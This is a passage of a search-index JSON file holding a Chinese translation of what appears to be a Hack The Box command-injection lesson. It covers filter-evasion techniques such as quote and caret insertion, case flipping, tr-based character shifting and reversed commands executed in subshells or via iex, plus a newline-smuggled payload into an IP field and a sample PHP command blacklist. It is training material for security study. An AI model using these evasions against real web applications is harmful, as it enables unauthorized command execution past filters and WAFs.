\u4e2d\uff0c\u5355\u8bcd\u88ab\u89c6\u4e3a\u4e00\u4e2a\u6570\u7ec4\uff0c\u56e0\u6b64\u6211\u4eec\u5fc5\u987b\u6307\u5b9a\u6240\u9700\u5b57\u7b26\u7684\u7d22\u5f15\u3002\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u4e00\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u5fc5\u6307\u5b9a\u5f00\u59cb\u548c\u7ed3\u675f\u4f4d\u7f6e\uff1a</p> <pre><code>PS C:\\htb&gt; $env:HOMEPATH[0]\n\n\\\n\n\nPS C:\\htb&gt; $env:PROGRAMFILES[10]\nPS C:\\htb&gt;\n</code></pre> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528 <code>Get-ChildItem Env:</code> PowerShell \u547d\u4ee4\u6253\u5370\u6240\u6709\u73af\u5883\u53d8\u91cf\uff0c\u7136\u540e\u9009\u62e9\u5176\u4e2d\u4e00\u4e2a\u6765\u751f\u6210\u6211\u4eec\u9700\u8981\u7684\u5b57\u7b26\u3002\u5c1d\u8bd5\u53d1\u6325\u521b\u610f\uff0c\u627e\u5230\u4e0d\u540c\u7684\u547d\u4ee4\u6765\u4ea7\u751f\u76f8\u4f3c\u4f5c\u7528\u7684\u5b57\u7b26\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_17","title":"\u5b57\u7b26\u8f6c\u6362","text":"<p>\u8fd8\u6709\u5176\u4ed6\u6280\u672f\u53ef\u4ee5\u5728\u4e0d\u4f7f\u7528\u5b57\u7b26\u7684\u60c5\u51b5\u4e0b\u751f\u6210\u6240\u9700\u7684\u5b57\u7b26\uff0c\u4f8b\u5982 <code>shifting characters</code> \u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u7684 Linux \u547d\u4ee4\u5c06\u6211\u4eec\u4f20\u9012\u7684\u5b57\u7b26\u79fb\u52a8 <code>1</code>\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u6240\u8981\u505a\u7684\u5c31\u662f\u5728 ASCII \u8868\u4e2d\u627e\u5230\u6211\u4eec\u9700\u8981\u7684\u5b57\u7b26\u4e4b\u524d\u7684\u5b57\u7b26\uff08\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>man ascii</code> \u83b7\u53d6\u5b83\uff09\uff0c\u7136\u540e\u6dfb\u52a0\u5b83\u800c\u4e0d\u662f\u4e0b\u9762\u793a\u4f8b\u4e2d\u7684 <code>[</code>\u3002\u8fd9\u6837\uff0c\u6700\u540e\u6253\u5370\u7684\u5b57\u7b26\u5c31\u662f\u6211\u4eec\u9700\u8981\u7684\u5b57\u7b26\uff1a</p> <pre><code>$ man ascii     # \\ is on 92, before it is [ on 91\n$ echo $(tr '!-}' '\"-~'&lt;&lt;&lt;[)\n\n\\\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 PowerShell \u547d\u4ee4\u5728 Windows \u4e2d\u83b7\u5f97\u76f8\u540c\u7684\u7ed3\u679c\uff0c\u5c3d\u7ba1\u5b83\u4eec\u53ef\u80fd\u6bd4 Linux \u7684\u547d\u4ee4\u957f\u5f97\u591a\u3002</p> <p>\u7ec3\u4e60\uff1a\u5c1d\u8bd5\u4f7f\u7528\u5b57\u7b26\u79fb\u4f4d\u6280\u672f\u751f\u6210\u5206\u53f7\uff1b\u7279\u70b9\u3002\u5148\u5728ascii\u8868\u4e2d\u627e\u5230\u5b83\u524d\u9762\u7684\u5b57\u7b26\uff0c\u7136\u540e\u5728\u4e0a\u9762\u7684\u547d\u4ee4\u4e2d\u4f7f\u7528\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_18","title":"\u7ed5\u8fc7\u5217\u5165\u9ed1\u540d\u5355\u547d\u4ee4","text":"<p>\u6211\u4eec\u5df2\u7ecf\u8ba8\u8bba\u4e86\u7ed5\u8fc7\u5355\u5b57\u7b26\u8fc7\u6ee4\u5668\u7684\u5404\u79cd\u65b9\u6cd5\u3002\u4f46\u662f\uff0c\u5728\u7ed5\u8fc7\u5217\u5165\u9ed1\u540d\u5355\u7684\u547d\u4ee4\u65f6\u6709\u4e0d\u540c\u7684\u65b9\u6cd5\u3002\u547d\u4ee4\u9ed1\u540d\u5355\u901a\u5e38\u7531\u4e00\u7ec4\u5355\u8bcd\u7ec4\u6210\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u6df7\u6dc6\u6211\u4eec\u7684\u547d\u4ee4\u5e76\u4f7f\u5b83\u4eec\u770b\u8d77\u6765\u4e0d\u540c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8fc7\u6ee4\u5668\u3002</p> <p>\u547d\u4ee4\u6df7\u6dc6\u7684\u65b9\u6cd5\u591a\u79cd\u591a\u6837\uff0c\u590d\u6742\u7a0b\u5ea6\u5404\u4e0d\u76f8\u540c\uff0c\u7a0d\u540e\u6211\u4eec\u5c06\u4ecb\u7ecd\u547d\u4ee4\u6df7\u6dc6\u5de5\u5177\u3002\u6211\u4eec\u5c06\u4ecb\u7ecd\u4e00\u4e9b\u57fa\u672c\u6280\u672f\uff0c\u8fd9\u4e9b\u6280\u672f\u53ef\u80fd\u4f7f\u6211\u4eec\u80fd\u591f\u66f4\u6539\u547d\u4ee4\u7684\u5916\u89c2\u4ee5\u624b\u52a8\u7ed5\u8fc7\u8fc7\u6ee4\u5668</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_19","title":"\u547d\u4ee4\u9ed1\u540d\u5355","text":"<p>\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5df2\u7ecf\u6210\u529f\u7ed5\u8fc7\u4e86\u8d1f\u8f7d\u4e2d\u7a7a\u683c\u548c\u5206\u53f7\u5b57\u7b26\u7684\u5b57\u7b26\u8fc7\u6ee4\u5668\u3002\u56e0\u6b64\uff0c\u8ba9\u6211\u4eec\u56de\u5230\u6211\u4eec\u7684\u7b2c\u4e00\u4e2a\u6709\u6548\u8d1f\u8f7d\u5e76\u91cd\u65b0\u6dfb\u52a0 <code>whoami</code> \u547d\u4ee4\u4ee5\u67e5\u770b\u5b83\u662f\u5426\u88ab\u6267\u884c:</p> <p>![[Pasted image 20221212131451.png]]</p> <p>\u6211\u4eec\u770b\u5230\uff0c\u5373\u4f7f\u6211\u4eec\u4f7f\u7528\u7684\u5b57\u7b26\u6ca1\u6709\u88ab Web \u5e94\u7528\u7a0b\u5e8f\u963b\u6b62\uff0c\u4e00\u65e6\u6211\u4eec\u6dfb\u52a0\u4e86\u547d\u4ee4\uff0c\u8bf7\u6c42\u5c31\u4f1a\u518d\u6b21\u88ab\u963b\u6b62\u3002\u8fd9\u53ef\u80fd\u662f\u7531\u4e8e\u53e6\u4e00\u79cd\u7c7b\u578b\u7684\u8fc7\u6ee4\u5668\uff0c\u5373\u547d\u4ee4\u9ed1\u540d\u5355\u8fc7\u6ee4\u5668\u3002</p> <p><code>PHP</code> \u4e2d\u7684\u57fa\u672c\u547d\u4ee4\u9ed1\u540d\u5355\u8fc7\u6ee4\u5668\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$blacklist = ['whoami', 'cat', ...SNIP...];\nforeach ($blacklist as $word) {\n    if (strpos('$_POST['ip']', $word) !== false) {\n        echo \"Invalid input\";\n    }\n}\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u5b83\u6b63\u5728\u68c0\u67e5\u7528\u6237\u8f93\u5165\u7684\u6bcf\u4e2a\u5355\u8bcd\uff0c\u770b\u5b83\u662f\u5426\u4e0e\u4efb\u4f55\u5217\u5165\u9ed1\u540d\u5355\u7684\u5355\u8bcd\u76f8\u5339\u914d\u3002\u4f46\u662f\uff0c\u6b64\u4ee3\u7801\u6b63\u5728\u5bfb\u627e\u4e0e\u63d0\u4f9b\u7684\u547d\u4ee4\u5b8c\u5168\u5339\u914d\u7684\u5185\u5bb9\uff0c\u56e0\u6b64\u5982\u679c\u6211\u4eec\u53d1\u9001\u7a0d\u5fae\u4e0d\u540c\u7684\u547d\u4ee4\uff0c\u5b83\u53ef\u80fd\u4e0d\u4f1a\u88ab\u963b\u6b62\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5404\u79cd\u6df7\u6dc6\u6280\u672f\u6765\u6267\u884c\u6211\u4eec\u7684\u547d\u4ee4\uff0c\u800c\u65e0\u9700\u4f7f\u7528\u786e\u5207\u7684\u547d\u4ee4\u8bcd\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#linux-windows","title":"Linux &amp; Windows","text":"<p>\u4e00\u79cd\u975e\u5e38\u5e38\u89c1\u4e14\u5bb9\u6613\u6df7\u6dc6\u7684\u6280\u672f\u662f\u5728\u6211\u4eec\u7684\u547d\u4ee4\u4e2d\u63d2\u5165\u67d0\u4e9b\u5b57\u7b26\uff0c\u8fd9\u4e9b\u5b57\u7b26\u901a\u5e38\u4f1a\u88ab <code>Bash</code> \u6216 <code>PowerShell</code> \u7b49\u547d\u4ee4 shell \u5ffd\u7565\uff0c\u5e76\u4e14\u4f1a\u6267\u884c\u76f8\u540c\u7684\u547d\u4ee4\uff0c\u5c31\u597d\u50cf\u5b83\u4eec\u4e0d\u5b58\u5728\u4e00\u6837\u3002\u5176\u4e2d\u4e00\u4e9b\u5b57\u7b26\u662f\u5355\u5f15\u53f7 <code>'</code> \u548c\u53cc\u5f15\u53f7 <code>\"</code>\uff0c\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u5b57\u7b26\u3002</p> <p>\u6700\u5bb9\u6613\u4f7f\u7528\u7684\u662f\u5f15\u53f7\uff0c\u5b83\u4eec\u9002\u7528\u4e8e Linux \u548c Windows \u670d\u52a1\u5668\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u60f3\u6df7\u6dc6 <code>whoami</code> \u547d\u4ee4\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u5b83\u7684\u5b57\u7b26\u4e4b\u95f4\u63d2\u5165\u5355\u5f15\u53f7\uff0c\u5982\u4e0b\uff1a</p> <pre><code>$ w'h'o'am'i\n\n21y4d\n</code></pre> <p>\u8fd9\u540c\u6837\u9002\u7528\u4e8e\u53cc\u5f15\u53f7\uff1a</p> <pre><code>$ w\"h\"o\"am\"i\n\n21y4d\n</code></pre> <p>\u9700\u8981\u8bb0\u4f4f\u7684\u91cd\u8981\u4e8b\u60c5\u662f\uff0c\u6211\u4eec\u4e0d\u80fd\u6df7\u5408\u5f15\u7528\u7684\u7c7b\u578b\uff0c\u5e76\u4e14\u5f15\u7528\u7684\u6570\u91cf\u5fc5\u987b\u662f\u5076\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u6211\u4eec\u7684 payload (<code>127.0.0.1%0aw'h'o'am'i</code>) \u4e2d\u5c1d\u8bd5\u4e0a\u8ff0\u4e4b\u4e00\uff0c\u770b\u770b\u5b83\u662f\u5426\u6709\u6548\uff1a</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#burp-post-request","title":"Burp POST Request","text":"<p>![[Pasted image 20221212131834.png]]</p> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u8fd9\u79cd\u65b9\u6cd5\u786e\u5b9e\u6709\u6548\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#linux_1","title":"\u4ec5\u9650 Linux","text":"<p>\u6211\u4eec\u53ef\u4ee5\u5728\u547d\u4ee4\u4e2d\u95f4\u63d2\u5165\u4e00\u4e9b\u5176\u4ed6 Linux \u4e13\u7528\u5b57\u7b26\uff0c<code>bash</code> shell \u4f1a\u5ffd\u7565\u5b83\u4eec\u5e76\u6267\u884c\u547d\u4ee4\u3002\u8fd9\u4e9b\u5b57\u7b26\u5305\u62ec\u53cd\u659c\u6760 <code>\\</code> \u548c\u4f4d\u7f6e\u53c2\u6570\u5b57\u7b26 <code>$@</code>\u3002\u8fd9\u4e0e\u5f15\u53f7\u5b8c\u5168\u4e00\u6837\uff0c\u4f46\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b57\u7b26\u6570\u4e0d\u5fc5\u662f\u5076\u6570\uff0c\u5982\u679c\u9700\u8981\uff0c\u6211\u4eec\u53ef\u4ee5\u53ea\u63d2\u5165\u5176\u4e2d\u4e00\u4e2a\uff1a</p> <pre><code>who$@ami\nw\\ho\\am\\i\n</code></pre> <p>\u7ec3\u4e60\uff1a\u5728\u4f60\u7684 payload \u4e2d\u5c1d\u8bd5\u4e0a\u9762\u7684\u4e24\u4e2a\u4f8b\u5b50\uff0c\u770b\u770b\u5b83\u4eec\u662f\u5426\u80fd\u7ed5\u8fc7\u547d\u4ee4\u8fc7\u6ee4\u5668\u3002\u5982\u679c\u6ca1\u6709\uff0c\u8fd9\u53ef\u80fd\u8868\u660e\u60a8\u53ef\u80fd\u4f7f\u7528\u4e86\u8fc7\u6ee4\u5b57\u7b26\u3002\u60a8\u662f\u5426\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6211\u4eec\u5728\u4e0a\u4e00\u8282\u4e2d\u5b66\u5230\u7684\u6280\u672f\u6765\u7ed5\u8fc7\u5b83\uff1f</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#windows_1","title":"\u4ec5\u9650 Windows","text":"<p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u5728\u4e0d\u5f71\u54cd\u7ed3\u679c\u7684\u547d\u4ee4\u4e2d\u95f4\u63d2\u5165\u4e00\u4e9b\u4ec5\u9650 Windows \u7684\u5b57\u7b26\uff0c\u4f8b\u5982\u63d2\u5165\u7b26\u53f7 (<code>^</code>) \u5b57\u7b26\uff0c\u5982\u4e0b\u4f8b\u6240\u793a\uff1a</p> <pre><code>C:\\htb&gt; who^ami\n\n21y4d\n</code></pre> <p>\u5728\u4e0b\u4e00\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u8ba8\u8bba\u4e00\u4e9b\u66f4\u9ad8\u7ea7\u7684\u547d\u4ee4\u6df7\u6dc6\u548c\u8fc7\u6ee4\u5668\u7ed5\u8fc7\u6280\u672f\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_20","title":"\u9ad8\u7ea7\u547d\u4ee4","text":"<p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u5904\u7406\u9ad8\u7ea7\u8fc7\u6ee4\u89e3\u51b3\u65b9\u6848\uff0c\u4f8b\u5982 Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899 (WAF)\uff0c\u800c\u57fa\u672c\u7684\u89c4\u907f\u6280\u672f\u53ef\u80fd\u4e0d\u4e00\u5b9a\u6709\u6548\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4f7f\u7528\u66f4\u5148\u8fdb\u7684\u6280\u672f\uff0c\u8fd9\u4f7f\u5f97\u68c0\u6d4b\u5230\u6ce8\u5165\u7684\u547d\u4ee4\u7684\u53ef\u80fd\u6027\u5927\u5927\u964d\u4f4e\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#case-manipulation","title":"Case Manipulation","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7684\u4e00\u79cd\u547d\u4ee4\u6df7\u6dc6\u6280\u672f\u662f\u5927\u5c0f\u5199\u64cd\u4f5c\uff0c\u4f8b\u5982\u53cd\u8f6c\u547d\u4ee4\u7684\u5b57\u7b26\u5927\u5c0f\u5199\uff08\u4f8b\u5982 <code>WHOAMI</code>\uff09\u6216\u5728\u5927\u5c0f\u5199\u4e4b\u95f4\u4ea4\u66ff\uff08\u4f8b\u5982 <code>WhOaMi</code>\uff09\u3002\u8fd9\u901a\u5e38\u6709\u6548\uff0c\u56e0\u4e3a\u547d\u4ee4\u9ed1\u540d\u5355\u53ef\u80fd\u4e0d\u4f1a\u68c0\u67e5\u5355\u4e2a\u5355\u8bcd\u7684\u4e0d\u540c\u5927\u5c0f\u5199\u53d8\u4f53\uff0c\u56e0\u4e3a Linux \u7cfb\u7edf\u533a\u5206\u5927\u5c0f\u5199\u3002</p> <p>\u5982\u679c\u6211\u4eec\u6b63\u5728\u5904\u7406 Windows \u670d\u52a1\u5668\uff0c\u6211\u4eec\u53ef\u4ee5\u66f4\u6539\u547d\u4ee4\u5b57\u7b26\u7684\u5927\u5c0f\u5199\u5e76\u53d1\u9001\u5b83\u3002\u5728 Windows \u4e2d\uff0cPowerShell \u548c CMD \u7684\u547d\u4ee4\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4eec\u5c06\u6267\u884c\u547d\u4ee4\u800c\u4e0d\u7ba1\u5b83\u662f\u7528\u4ec0\u4e48\u5199\u7684\uff1a</p> <pre><code>PS C:\\htb&gt; WhOaMi\n\n21y4d\n</code></pre> <p>\u7136\u800c\uff0c\u5f53\u6d89\u53ca\u5230\u533a\u5206\u5927\u5c0f\u5199\u7684 Linux \u548c bash shell \u65f6\uff0c\u5982\u524d\u6240\u8ff0\uff0c\u6211\u4eec\u5fc5\u987b\u6709\u70b9\u521b\u610f\u5e76\u627e\u5230\u4e00\u4e2a\u5c06\u547d\u4ee4\u53d8\u6210\u5168\u5c0f\u5199\u5355\u8bcd\u7684\u547d\u4ee4\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7684\u4e00\u4e2a\u5de5\u4f5c\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>$ $(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")\n\n21y4d\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u6240\u89c1\uff0c\u8be5\u547d\u4ee4\u786e\u5b9e\u6709\u6548\uff0c\u5373\u4f7f\u6211\u4eec\u63d0\u4f9b\u7684\u5355\u8bcd\u662f (<code>WhOaMi</code>)\u3002\u6b64\u547d\u4ee4\u4f7f\u7528 tr \u5c06\u6240\u6709\u5927\u5199\u5b57\u7b26\u66ff\u6362\u4e3a\u5c0f\u5199\u5b57\u7b26\uff0c\u8fd9\u5c06\u751f\u6210\u4e00\u4e2a\u5168\u5c0f\u5199\u5b57\u7b26\u547d\u4ee4\u3002\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u5c06\u4e0a\u8ff0\u547d\u4ee4\u4e0e <code>Host Checker</code> Web \u5e94\u7528\u7a0b\u5e8f\u4e00\u8d77\u4f7f\u7528\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u5b83\u4ecd\u7136\u88ab\u963b\u6b62\uff1a</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#burp-post-request_1","title":"Burp POST Request","text":"<p>![[Pasted image 20221212132849.png]]</p> <p>\u4f60\u80fd\u731c\u51fa\u4e3a\u4ec0\u4e48\u5417\uff1f\u8fd9\u662f\u56e0\u4e3a\u4e0a\u9762\u7684\u547d\u4ee4\u5305\u542b\u7a7a\u683c\uff0c\u8fd9\u662f\u6211\u4eec\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u8fc7\u6ee4\u5b57\u7b26\uff0c\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u770b\u5230\u7684\u90a3\u6837\u3002\u6240\u4ee5\uff0c\u4f7f\u7528\u8fd9\u4e9b\u6280\u672f\uff0c\u6211\u4eec\u5fc5\u987b\u59cb\u7ec8\u786e\u4fdd\u4e0d\u4f7f\u7528\u4efb\u4f55\u8fc7\u6ee4\u5b57\u7b26\uff0c\u5426\u5219\u6211\u4eec\u7684\u8bf7\u6c42\u5c06\u5931\u8d25\uff0c\u5e76\u4e14\u6211\u4eec\u53ef\u80fd\u8ba4\u4e3a\u8fd9\u4e9b\u6280\u672f\u5931\u8d25\u4e86\u3002</p> <p>\u4e00\u65e6\u6211\u4eec\u7528\u5236\u8868\u7b26 (<code>%09</code>) \u66ff\u6362\u7a7a\u683c\uff0c\u6211\u4eec\u5c31\u4f1a\u770b\u5230\u8be5\u547d\u4ee4\u5b8c\u7f8e\u8fd0\u884c\uff1a</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#burp-post-request_2","title":"Burp POST Request","text":"<p>![[Pasted image 20221212133000.png]]</p> <p>\u6211\u4eec\u53ef\u4ee5\u51fa\u4e8e\u76f8\u540c\u76ee\u7684\u4f7f\u7528\u8bb8\u591a\u5176\u4ed6\u547d\u4ee4\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$(a=\"WhOaMi\";printf %s \"${a,,}\")\n</code></pre> <p>\u7ec3\u4e60\uff1a\u4f60\u80fd\u6d4b\u8bd5\u4e0a\u9762\u7684\u547d\u4ee4\u770b\u770b\u5b83\u662f\u5426\u80fd\u5728\u4f60\u7684 Linux VM \u4e0a\u8fd0\u884c\uff0c\u7136\u540e\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u8fc7\u6ee4\u5b57\u7b26\u6765\u8ba9\u5b83\u5728 web \u5e94\u7528\u7a0b\u5e8f\u4e0a\u8fd0\u884c\u5417\uff1f</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_21","title":"\u547d\u4ee4\u53cd\u5199","text":"<p>\u6211\u4eec\u5c06\u8ba8\u8bba\u7684\u53e6\u4e00\u79cd\u547d\u4ee4\u6df7\u6dc6\u6280\u672f\u662f\u9006\u5411\u547d\u4ee4\uff0c\u5e76\u6709\u4e00\u4e2a\u547d\u4ee4\u6a21\u677f\u53ef\u4ee5\u5c06\u5b83\u4eec\u5207\u6362\u56de\u6765\u5e76\u5b9e\u65f6\u6267\u884c\u5b83\u4eec\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5c06\u7f16\u5199 <code>imaohw</code> \u800c\u4e0d\u662f <code>whoami</code> \u4ee5\u907f\u514d\u89e6\u53d1\u5217\u5165\u9ed1\u540d\u5355\u7684\u547d\u4ee4\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6280\u672f\u53d1\u6325\u521b\u610f\uff0c\u521b\u5efa\u6211\u4eec\u81ea\u5df1\u7684 Linux/Windows \u547d\u4ee4\uff0c\u8fd9\u4e9b\u547d\u4ee4\u6700\u7ec8\u4f1a\u5728\u4e0d\u5305\u542b\u5b9e\u9645\u547d\u4ee4\u5b57\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u3002\u9996\u5148\uff0c\u6211\u4eec\u5fc5\u987b\u5728\u7ec8\u7aef\u4e2d\u83b7\u53d6\u547d\u4ee4\u7684\u53cd\u5411\u5b57\u7b26\u4e32\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ echo 'whoami' | rev\nimaohw\n</code></pre> <p>\u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728\u5b50 shell (<code>$()</code>) \u4e2d\u5c06\u5176\u53cd\u8f6c\u6765\u6267\u884c\u539f\u59cb\u547d\u4ee4\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ $(rev&lt;&lt;&lt;'imaohw')\n\n21y4d\n</code></pre> <p>\u6211\u4eec\u770b\u5230\uff0c\u5373\u4f7f\u8be5\u547d\u4ee4\u4e0d\u5305\u542b\u5b9e\u9645\u7684 <code>whoami</code> \u8bcd\uff0c\u5b83\u4e5f\u80fd\u6b63\u5e38\u5de5\u4f5c\u5e76\u63d0\u4f9b\u9884\u671f\u7684\u8f93\u51fa\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u7528\u6211\u4eec\u7684\u7ec3\u4e60\u6765\u6d4b\u8bd5\u8fd9\u4e2a\u547d\u4ee4\uff0c\u5b83\u786e\u5b9e\u6709\u6548\uff1a</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#burp-post-request_3","title":"Burp POST Request","text":"<p>![[Pasted image 20221212133237.png]]</p> <p>\u63d0\u793a\uff1a\u5982\u679c\u4f60\u60f3\u7528\u4e0a\u8ff0\u65b9\u6cd5\u7ed5\u8fc7\u5b57\u7b26\u8fc7\u6ee4\u5668\uff0c\u4f60\u8fd8\u5fc5\u987b\u53cd\u8f6c\u5b83\u4eec\uff0c\u6216\u8005\u5728\u53cd\u8f6c\u539f\u59cb\u547d\u4ee4\u65f6\u5305\u62ec\u5b83\u4eec\u3002</p> <p>\u5728 <code>Windows</code> \u4e2d\u4e5f\u53ef\u4ee5\u5e94\u7528\u540c\u6837\u7684\u65b9\u6cd5\u3002\u6211\u4eec\u53ef\u4ee5\u5148\u53cd\u8f6c\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u4e0b\uff1a</p> <pre><code>PS C:\\htb&gt; \"whoami\"[-1..-20] -join ''\n\nimaohw\n</code></pre> <p>\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u901a\u8fc7 PowerShell \u5b50 shell\uff08<code>iex \"$()\"</code>\uff09\u6267\u884c\u53cd\u5411\u5b57\u7b26\u4e32\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>PS C:\\htb&gt; iex \"$('imaohw'[-1..-20] -join '')\"\n\n21y4d\n</code></pre>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_22","title":"\u7f16\u7801\u6307\u4ee4","text":"<p>\u6211\u4eec\u5c06\u8ba8\u8bba\u7684\u6700\u540e\u4e00\u79cd\u6280\u672f\u5bf9\u4e8e\u5305\u542b\u8fc7\u6ee4\u5b57\u7b26\u6216\u53ef\u80fd\u7531\u670d\u52a1\u5668\u8fdb\u884c URL \u89e3\u7801\u7684\u5b57\u7b26\u7684\u547d\u4ee4\u5f88\u6709\u5e2e\u52a9\u3002\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u547d\u4ee4\u5728\u5230\u8fbe shell \u65f6\u53d8\u5f97\u6df7\u4e71\u5e76\u6700\u7ec8\u65e0\u6cd5\u6267\u884c\u3002\u8fd9\u6b21\u6211\u4eec\u5c06\u5c1d\u8bd5\u521b\u5efa\u81ea\u5df1\u72ec\u7279\u7684\u6df7\u6dc6\u547d\u4ee4\uff0c\u800c\u4e0d\u662f\u5728\u7ebf\u590d\u5236\u73b0\u6709\u547d\u4ee4\u3002\u8fd9\u6837\uff0c\u5b83\u5c31\u4e0d\u592a\u53ef\u80fd\u88ab\u8fc7\u6ee4\u5668\u6216 WAF \u62d2\u7edd\u3002\u6211\u4eec\u521b\u5efa\u7684\u547d\u4ee4\u5bf9\u4e8e\u6bcf\u79cd\u60c5\u51b5\u90fd\u662f\u552f\u4e00\u7684\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u5141\u8bb8\u4f7f\u7528\u7684\u5b57\u7b26\u548c\u670d\u52a1\u5668\u7684\u5b89\u5168\u7ea7\u522b\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5404\u79cd\u7f16\u7801\u5de5\u5177\uff0c\u5982 <code>base64</code>\uff08\u7528\u4e8e b64 \u7f16\u7801\uff09\u6216 